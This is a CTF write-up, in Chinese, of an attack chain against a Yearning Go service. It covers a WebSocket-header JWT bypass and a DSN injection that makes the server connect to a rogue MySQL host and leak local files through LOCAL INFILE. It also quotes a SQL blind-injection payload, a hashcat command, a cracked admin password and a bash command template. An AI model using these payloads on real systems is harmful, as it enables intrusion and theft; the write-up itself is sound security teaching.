# Doctor

## 题目简述

题目部署的是 Yearning 相关 Go 服务。可用解法由两个漏洞串联：

1. JWT 中间件只要看到请求被识别为 WebSocket 就直接返回，未验证当前 API 是否真的完成 WebSocket upgrade，因此普通接口可用 upgrade 头绕过认证；
2. 数据源查询忽略“`source_id` 不存在”的错误，继续用全零数据源结构和用户可控的 `DataBase` 构造 MySQL DSN。`FormatDSN` 与 `ParseDSN` 的组合使 `DataBase` 从数据库名扩展为几乎完整的 DSN，并可注入 `allowAllFiles=true`。

连接到恶意 MySQL 服务后，服务端可发起 `LOAD DATA LOCAL INFILE` 文件请求，让题目进程把本地目标文件内容回传。原设计的 SQL 注入链在比赛部署中缺少必要的预置数据源，实际不可用，不能与上述非预期解混为一谈。

## 解题过程

### 用 WebSocket 头绕过 JWT

JWT 中间件包含：

```go
return func(c yee.Context) (err error) {
    // websocket upgrade clears the custom JWT header
    if c.IsWebsocket() {
        return nil
    }

    // 正常 JWT 校验
}
```

`c.IsWebsocket()` 只根据 upgrade 相关请求头判断，而没有确认当前路由是否属于 WebSocket，也没有要求握手最终成功。因此访问普通受保护 API 时加入：

```http
Connection: Upgrade
Upgrade: websocket
```

中间件就会跳过 JWT。安全实现应只对明确的 WebSocket 路由采用单独认证流程，并在升级前验证 token，不能把“带 upgrade 头”直接等同于可信连接。

### 让空数据源进入 DSN 构造

受影响逻辑为：

```go
func (u *_FetchBind) FetchTableFieldsOrIndexes() error {
    var source model.CoreDataSource

    model.DB().
        Where("source_id = ?", u.SourceId).
        First(&source)

    password := lib.Decrypt(model.JWT, source.Password)
    db, err := model.NewDBSub(model.DSN{
        Username: source.Username,
        Password: password,
        Host:     source.IP,
        Port:     source.Port,
        DBName:   u.DataBase,
        CA:       source.CAFile,
        Cert:     source.Cert,
        Key:      source.KeyFile,
    })

    // ...
}
```

查询错误没有被检查。传入不存在的 `SourceId` 后，`source` 保持零值，只有 `u.DataBase` 仍由请求控制。

项目使用 `go-sql-driver/mysql v1.7.1`。其 [`Config.FormatDSN`](https://github.com/go-sql-driver/mysql/blob/v1.7.1/dsn.go) 在用户名、网络和地址均为空时，结果只剩：

```text
/DBName
```

同一文件中的 `ParseDSN` 从字符串末尾向前寻找最后一个 `/`，原因是密码和网络地址本身也可能含 `/`。因此把 `DataBase` 设置为：

```text
user:pass@tcp(<rogue-host>:<port>)/db?allowAllFiles=true
```

格式化后的字符串为：

```text
/user:pass@tcp(<rogue-host>:<port>)/db?allowAllFiles=true
```

解析器选择第二个 `/` 作为数据库名分隔符。前面的首个 `/` 被纳入用户名，所以最终配置近似为：

```text
User          = "/user"
Passwd        = "pass"
Net           = "tcp"
Addr          = "<rogue-host>:<port>"
DBName        = "db"
AllowAllFiles = true
```

恶意服务端并不在意用户名多出的 `/`，其余连接字段和参数均已受控。

### Rogue MySQL 读取本地文件

`allowAllFiles=true` 会关闭驱动对 `LOAD DATA LOCAL INFILE` 本地文件的限制。完整攻击顺序为：

1. 启动能够模拟 MySQL 握手并发送 LOCAL INFILE 请求的恶意服务；
2. 用不存在的 `source_id` 和上述 `DataBase` 调用字段/索引查询接口；
3. 题目进程按注入后的 DSN 连接恶意服务；
4. 恶意服务向客户端请求读取指定本地文件；
5. Go MySQL 客户端把文件内容作为 LOCAL INFILE 数据流发回；
6. 在恶意服务端记录收到的内容。

原材料没有给出部署时 flag 的实际文件路径，因此不能把某个猜测路径写成已验证事实。复现时应从容器配置、启动脚本或题面线索确定目标文件。

### 原预期链为什么不可用

原本计划在 JWT 绕过后，利用以下拼接语句进行盲注：

```go
db.Raw(fmt.Sprintf(
    "SHOW FULL FIELDS FROM `%s`.`%s`",
    u.DataBase,
    u.Table,
)).Scan(&u.Rows)
```

例如把表名设为：

```text
existed` where 1=if(1=1,1,0)#
```

即可闭合反引号并用响应差异做布尔盲注。但这条链有一个必要条件：请求中的 `source_id` 必须对应一个已经配置、且指向 Yearning 自身数据库的数据源。比赛实例没有提供这个数据源，也没有其他方式取得有效 `source_id`，所以 SQL 注入语句本身成立，并不等于整条攻击链可达。

若满足该前提，设计意图是：

1. 盲注提取管理员密码哈希；
2. 哈希格式为 PBKDF2-HMAC-SHA256，迭代次数被降为 1；
3. 字典破解得到密码 `D3nnisakadj`；
4. 登录管理员后台，开启 Yearning 的 OSC 功能；
5. 把 OSC 命令模板改成可控 shell 命令，再提交触发 OSC 的 DDL。

原文的 Hashcat 参数顺序写反了。正确形式应为：

```powershell
.\hashcat.exe -m 10900 -a 0 .\p.txt .\wordlist.txt
```

计划中的 OSC 配置为：

```text
IsOSC   = true
OscSize = 1
OSCExpr = bash -c "<command>"
```

随后提交符合 Yearning 流程的 DDL，例如：

```sql
ALTER TABLE yearning.aaa
ADD COLUMN bbb varchar(20) DEFAULT '' COMMENT 'bbb';

CREATE TABLE aaa AS
SELECT * FROM information_schema.COLUMNS;
```

这部分只说明原设计意图；由于比赛部署缺少预置数据源，不能标记为可复现成功解。

## 方法总结

可用链路是“伪 WebSocket 头绕过 JWT→无效 `source_id` 留下零值结构→`DataBase` 污染完整 DSN→`allowAllFiles=true`→Rogue MySQL 的 LOCAL INFILE 文件读取”。最隐蔽的环节不是单次拼接，而是同一字符串先经过 `FormatDSN`、再经过按最后一个 `/` 切分的 `ParseDSN`，两段看似合理的逻辑组合出了参数注入。

本题也说明应区分“局部漏洞存在”和“攻击链可达”。预期 SQL 注入点确实存在，但缺少有效数据源时无法执行查询；非预期 DSN 注入反而利用了错误处理缺失，在零值配置上建立了完整的外连与文件读取能力。
